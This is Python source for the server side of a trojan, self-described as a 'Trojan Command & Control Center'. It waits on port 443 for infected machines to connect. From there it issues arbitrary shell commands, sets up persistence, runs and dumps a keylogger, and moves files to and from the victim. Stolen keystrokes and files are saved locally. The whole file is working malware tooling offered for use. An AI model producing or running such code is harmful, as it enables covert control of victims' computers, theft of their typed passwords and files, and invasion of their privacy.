import os
import socket
import sys
import shlex
import base64

from pathlib import Path
from datetime import datetime

from pydantic import FilePath


HOST = "0.0.0.0"
PORT = 443
KEYLOGGER_PATH = "keylogger_dumps"
DOWNLOAD_PATH = "downloads"

def print_banner():
    banner = """
    ========================================================
                 TROJAN COMMAND & CONTROL CENTER 
                         BY LABUM
    ========================================================
    """
    print(banner)
    
def print_help():
    print("""             
======================================================================            
                       AVAILABLE COMMANDS
======================================================================                      
    PERSISTENCE:
        /persistence status          - Check persistence status
        / persistence setup           - Setup persistence 
    KEYLOGGER:
        /Keylog status                - Check Keylogger status
        /keylog start                 - Start Keylogger
        /keylog stop                  - Stop Keylogger
        /keylog dump                  - Dump captured keys
    FILE TRANSFER:
        /download "<remote_path>"     - Download file
        
        /upload "<local_path>" "<remote_path>"   
                                      - Upload file
            
    SYSTEM:
         cd <path>                   - Change directory
        /exit                         - Disconnect client
        /help                          - Show this help menu
        /clear                          - Clear screen

    SHELL COMMANDS:
       Any other command will be executed as shell command
====================================================================== 
====================================================================== 
""") 
    
def save_downloaded_file(data, original_filename):
    try:
        if not os.path.exists(DOWNLOAD_PATH):
            os.makedirs(DOWNLOAD_PATH)
            
        file_data = base64.b64decode(data.strip())
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        name, ext = os.path.splitext(original_filename)
        filename = f"{name}_{timestamp}{ext}"
        
        file_path = os.path.join(DOWNLOAD_PATH, filename)
        
        with open(file_path, "wb") as f:
            f.write(file_data)
            
        print(f"\n [+] File downloaded and saved as: {file_path}")
        print(f"[i] size? {len(file_data)} bytes") 
        return True
        
    except Exception as e:
        print(f"\n[-] Error saving file: {e}")
        return False           

def read_file_to_upload(filepath):
    try:
        if not os.path.isfile(filepath):
            print(f"\n[-] File not found: {filepath}")
            return None
        
        with open(filepath, "rb") as f:
            file_data = f.read()
            
            return{
                'data': base64.b64encode(file_data).decode('utf-8'),
                'size': len(file_data),
                'filename': Path(filepath).name
            }
        
     
    except Exception as e:
        print(f"\n[-] Error reading file: {e}")
        return None   

    
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def save_keylog(data, filename=None):
    try:
        if not os.path.exists(KEYLOGGER_PATH):
            os.makedirs(KEYLOGGER_PATH)
            
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"keylog_{timestamp}.txt"
            
        file_path = os.path.join(KEYLOGGER_PATH, filename)  
        
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(data)
            
        print(f"\n [+] Keylog saved as: {filename}")
        return True          
        
    except Exception as e:
        print(f"\n[-] Error saving keylog: {e}")
        return False
    
def handle_client(conn, addr):
    print(f"\n[#] Client connected: {addr[0]}:{addr[1]}")
    print(f"[i] Connection established at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("[i] Type /help for available commands.\n") 
    
    try:
        initial_msg = conn.recv(1024).decode('utf-8', errors='ignore')
        if initial_msg:
            print(initial_msg, end='')
        
        while True:
            try:
                command = input(f"\033[1;32m{addr[0]}\033[1;36m>\033[0;0m ").strip()
                
                if not command:
                    continue
                
                if command == "/help":
                    print_help()
                    continue
                
                elif command == "/clear":
                    clear_screen()
                    print_banner()
                    print(f"[#] Connected to: {addr[0]}:{addr[1]}\n")
                    continue
                
                elif command.startswith("/download "):
                    try:
                        parts = shlex.split(command)
                        if len(parts) < 2:
                            print("\n[-] Usage: /download \"<remote_path>\"")
                            continue
                    
                        remote_path = parts[1]
                        
                        conn.send(f"/download {remote_path}\n".encode())
                
                    except ValueError as e:
                        print(f"\n[-] Invalid command syntax: {e}")
                        
                    conn.send(command.encode() + b"\n")   
                    
                    buffer = b""
                    in_file = False
                    filename = None
                    
                    conn.settimeout(10)  # Set timeout for receiving data
                    
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        
                        buffer += chunk
                        
                        if b"[FILE-START]" in buffer and not in_file:
                            in_file =True
                            parts = buffer.split(b"[FILE-START]")
                            header = parts[0].decode('utf-8', errors='ignore')
                            print(header)
                            
                            for line in header.split("\n"):
                                if "Filename:" in line:
                                    filename = line.split("Filename:")[1].strip()
                                    
                            buffer = parts[1]
                            
                        if b"[FILE-END]" in buffer:
                            file_data = buffer.split(b"[FILE-END]")[0]
                            
                            if filename:
                                save_downloaded_file(file_data.decode('utf-8'), filename)
                            else:
                                print("\n[-] Could not determine filename")
                                break
                            
                    continue                         
                        
                        
                elif command.startswith("/upload "):
                    try:
                        parts = shlex.split(command)
                        if len(parts) < 3:
                            print("\n[-] Usage: /upload \"<local_file>\" \"<remote_path>\"")
                            continue
                        
                        local_path = parts[1]
                        remote_path = parts[2]
                        
                        file_info = read_file_to_upload(local_path)
                        
                        if not file_info:
                            continue
                        
                        print(f"\n[i] Uploading {file_info['filename']}) ({file_info['size']} bytes) ...")
                        
                        conn.send(f"/upload {remote_path}\n".encode())
                        
                    except ValueError as e:
                        print(f"\n[-] Invalid command syntax: {e}")
                        continue 
                    
                    response = conn.recv(1024).decode('utf-8', errors='ignore')
                    print(response, end='')
                    
                    if "Ready to receive" in response:
                        conn.send(file_info['data'].encode())
                        conn.send(b"\n[UPLOAD_END]\n")
                        
                        conn.settimeout(5)  # Set timeout for upload response
                        result = conn.recv(4096).decode('utf-8', errors='ignore')
                        print(result, end='')
                        
                        continue
                
                conn.send(command.encode() + b"\n")
                
                if command == "/exit":
                    print("\n[!] Client disconnected")
                    break
                
                response = b""
                conn.settimeout(2.0)  # Set timeout for receiving data
                
                while True:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        
                        response += chunk
                        
                        if response.endswith(b"\n\n"):
                            break
                    
                    except socket.timeout:
                        break
                    
                if response:
                    decoded = response.decode('utf-8', errors='ignore')

                    if "[AUTO-SEND]" in decoded:
                        Keylog_content = decoded.split("[AUTO-SEND]")[1].strip()
                        save_keylog(Keylog_content)

                    elif command == "/Keylog dump":
                        print(decoded)

                        if "[+] keylog captured" in decoded:
                            save = input("Save this keylog? (y/n): ").lower()
                            if save == 'y':
                                save_keylog(decoded)

                    else:
                        print(decoded, end='')

                else:
                    print("[!] No response from client")

            except KeyboardInterrupt:
                print("\n[!] Interrupted. Sending exit command...")
                conn.send(b"/exit\n")
                break
            
            except Exception as e:
                print(f"\n[-] Error: {e}")
                break
    
    except Exception as e:
        print(f"[-] Connection error: {e}")
        
    finally:
        conn.close()
        print(f"\n[!] Connection closed:")    

def start_listener():
    print_banner()
    
    try:
        s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        
        print(f"[i] Listening on {HOST}:{PORT}...")
        print(f"[i] Waiting for incoming connections... \n")

        while True:
            try:
                conn, addr = s.accept()
                handle_client(conn, addr)
                
                print("\n" + "="*60 + "\n")
                choice = input("Wait for new connection? (y/n): ").lower()
                if choice != 'y':
                    print("[i] Shutting down listener...")
                    break
                
                print(f"[i] Waiting for connections... \n")
                
                
            except KeyboardInterrupt:
                print("\n[!] Interrupt by user")
                break 


        
    except Exception as e:
        print(f"[-] Listener error: {e}")
    
    finally:
        s.close()
        print("[i] Listener stopped.")    
                  
                  
if __name__ == "__main__":
    try: 
        start_listener()
    
    
    except KeyboardInterrupt:
        print("\n[!] Exiting ...")
        sys.exit(0)                  